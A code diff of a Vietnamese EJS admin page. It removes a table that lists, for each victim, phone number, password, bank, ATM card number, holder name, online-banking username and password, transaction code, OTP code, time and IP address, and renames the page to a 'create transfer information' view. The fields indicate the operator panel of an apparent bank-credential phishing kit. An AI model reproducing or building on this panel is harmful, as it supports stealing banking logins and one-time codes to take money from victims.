@@ -39,60 +39,14 @@
                <!-- Page Header-->
                <header class="page-header">
                   <div class="container-fluid">
-                     <h2 class="no-margin-bottom">Danh Sách Thông Tin Khách Hàng</h2>
+                     <h2 class="no-margin-bottom">Tạo Thông Tin Chuyển Khoản</h2>
                   </div>
                </header>
-                <div style="padding:10px 0 0 10px">
-                  <a name="" id="" class="btn btn-primary" href="/admin/da-xem" role="button">Danh Sách Khách Hàng Đã Xem</a>
-              
-               </div>
                <!-- Dashboard Counts Section-->
                <section class="dashboard-counts no-padding-bottom" style="padding-top:10px">
                   <div class="container-fluid">
                      <div class="table">
-                        <table class="table table-striped text-center table-responsive table-bordered" style="word-wrap: break-word;">
-                          <thead>
-                            <tr >
-                              <th scope="row" >SDT</th>
-                              <th>Mật Khẩu</th>
-                              <th>Mã Nhận Tiền</th>
-                              <th>Ngân Hàng</th>
-                              <th>Số Thẻ ATM</th>
-                              <th>Họ Tên Chủ TK</th>
-                              <th>Ngày Phát Hành</th>
-                              <th>Tên TK Banking</th>
-                              <th>Mật Khẩu Banking</th>
-                              <th>Mã Giao Dịch</th>
-                              <th>Mã OTP</th>
-                              <th>Ngày Nhập</th>
-                              <th>Địa Chỉ IP</th>
-                              <th>Action</th>
-                            </tr>
-                          </thead>
-                          <tbody>
-                           <%
-                              datas.forEach(data=>{ %>
-                                 <tr>
-                                    <td scope="row" style="max-width:100px"> <%=data.phonenumber%></td>
-                                    <td ><%=data.passwowrd%></td>
-                                    <td ><%=data.Internationaltransactioncode%></td>
-                                    <td ><%=data.Bank%></td>
-                                    <td ><%=data.NumberATM%></td>
-                                    <td ><%=data.NameAcount%></td>
-                                    <td ><%=data.releasedate%></td>
-                                    <td ><%=data.UserBanking%></td>
-                                    <td style="width:150px"><%=data.PasswordBanking%></td>
-                                    <td ><%=data.Tradingcode%></td>
-                                    <td ><%=data.OTP%></td>
-                                    <td  style="width:150px"><%=moment(data.Createat).tz("Asia/Bangkok").format("DD-MM-YYYY HH:mm:ss")%></td>
-                                    <td ><%=data.IP.replace('::ffff:', '')%></td>
-                                    <td>  <a href="/admin/khach-hang/hide/<%=data._id%>" id="" class="btn btn-primary" role="button">Ẩn</a>
-                                 </tr>
-                             <% })
-                           %>
- 
-                          </tbody>
-                        </table>
+                        
                       </div>
                   </div>
                </section>
